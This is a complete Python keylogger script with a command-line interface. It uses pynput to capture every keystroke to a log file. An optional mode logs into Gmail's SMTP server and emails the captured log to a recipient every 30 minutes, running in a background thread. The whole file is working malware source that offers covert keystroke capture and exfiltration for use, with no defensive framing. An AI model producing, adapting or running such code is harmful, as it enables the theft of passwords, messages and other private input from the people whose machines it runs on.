#!/usr/bin/env python
import argparse
import os
import sys
from pynput.keyboard import Key, Listener
import logging
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from threading import Thread
import time
import datetime

# Using argparse to create a user friendly command line interface

my_parser = argparse.ArgumentParser(prog='keylogger',
                                    usage='%(prog)s [options] -f ',
                                    description="A keylogger to capture the keystrokes of a user.")

my_parser.add_argument('-f',
                       metavar='file',
                       type=str,
                       help='specify the name of the file, by default: keys.txt',
                       nargs='?',
                       default='keys.txt')

my_parser.add_argument('-dir',
                       metavar='dir',
                       type=str,
                       help='specify the name of the directory to save the file in, by default: current directory',
                       nargs='?',
                       default='')

my_parser.add_argument('-m',
                       action='store_true',
                       help='set flag to allow email.')

my_parser.add_argument('-e',
                       metavar='email',
                       help='specify email to send file to, only works with gmail right now.')

my_parser.add_argument('-p',
                       metavar='password',
                       help='specify password to use with email service.')

args = my_parser.parse_args()

def on_press(key):
    logging.info(str(key))

# Function will connect to the gmail smpt server and then login with user provided account, it will create and send the message to the email provided.
def create_email(args):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(args.e, args.p)

    msg = MIMEMultipart()
    msg['From'] = 'Some user'
    msg['To'] = 'some user'
    msg['subject'] = 'Just a message'

    with open(args.f, 'r') as f:
        message = f.read()
    
    msg.attach(MIMEText(message, 'plain'))
    text = msg.as_string()
    server.sendmail(args.e, "enter receivers email here", text)

# In charge of sending our email every 30 minutes, can be changed 
def send_email_at(send_time, args):
    time.sleep(send_time.timestamp() - time.time())
    create_email(args)
    print('email sent')

# Function that will check that the user provided all of the arguments for the email feature - so far only works with gmail.
def check_email(args):
    if args.m and (args.e is None or args.p is None):
        print("Not sending email, missing arguments.")
        sys.exit()
    elif args.m and (args.e and args.p):
        return True

# The main body of our keylogger, will be in charge of recording users keypresses 
def keylogger_main(args):
    logging.basicConfig(filename=(args.dir + args.f),
                        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    with Listener(on_press=on_press) as listener:
        listener.join()


# This is our main function, and it will be in charge of executing our script.
if __name__ == '__main__':
    # We use threading so we can capture keystrokes and send our emails at the same time wihout no interruptions.
    Thread(target=keylogger_main, args=(args,)).start()
    reply = check_email(args)
    print(reply)

    if reply == True:
        print("Logging you to your email...")
        now = datetime.datetime.now() # set your sending time in UTC
        now_plus = now + datetime.timedelta(minutes = 30)
        interval = datetime.timedelta(minutes=30) # set the interval for sending the email

        send_time = now_plus
        while True:
            send_email_at(send_time, args)
            send_time = send_time + interval
        
